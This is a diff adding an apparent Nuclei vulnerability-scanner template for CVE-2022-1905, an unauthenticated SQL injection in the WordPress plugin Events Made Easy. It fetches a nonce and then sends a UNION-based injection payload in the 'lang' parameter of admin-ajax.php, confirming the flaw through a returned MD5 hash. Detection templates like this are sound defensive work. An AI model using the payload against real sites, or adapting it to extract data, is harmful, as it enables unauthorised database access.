@@ -1,0 +1,47 @@
+id: CVE-2022-1905
+info:
+  name: WordPress Plugin Events Made Easy SQL Injection Vulnerability
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    Events Made Easy is a full-featured event and membership management solution for WordPress. Events Made Easy 2.2.81 has an unauthorized SQL injection vulnerability.
+  reference:
+    - https://wpscan.com/vulnerability/ff5fd894-aff3-400a-8eec-fad9d50f788e
+  classification:
+    cve-id: CVE-2022-1905
+    cvss-metrics: 3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
+    cvss-score: 9.8
+  metadata:
+    product: wordpress-plugin-events-made-easy
+    homepage: https://wordpress.org/plugins/events-made-easy/
+
+flow: |
+  http(1) && http(2)
+
+http:
+  - id: get-nonce
+    method: GET
+    path:
+      - "{{BaseURL}}/events/"
+    matchers-condition: and
+    extractors:
+      - type: regex
+        name: translate_frontendnonce
+        internal: true
+        part: body
+        regex:
+          - 'translate_frontendnonce":"(.+?)"'
+
+  - id: sql-injection-test
+    method: GET
+    path:
+      - "{{BaseURL}}/wp-admin/admin-ajax.php?action=eme_select_country&eme_frontend_nonce={{translate_frontendnonce}}&lang=enen'+UNION+ALL+SELECT+NULL,(select+md5(123456)),NULL,NULL,NULL,NULL--+-"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "e10adc3949ba59abbe56e057f20f883e"
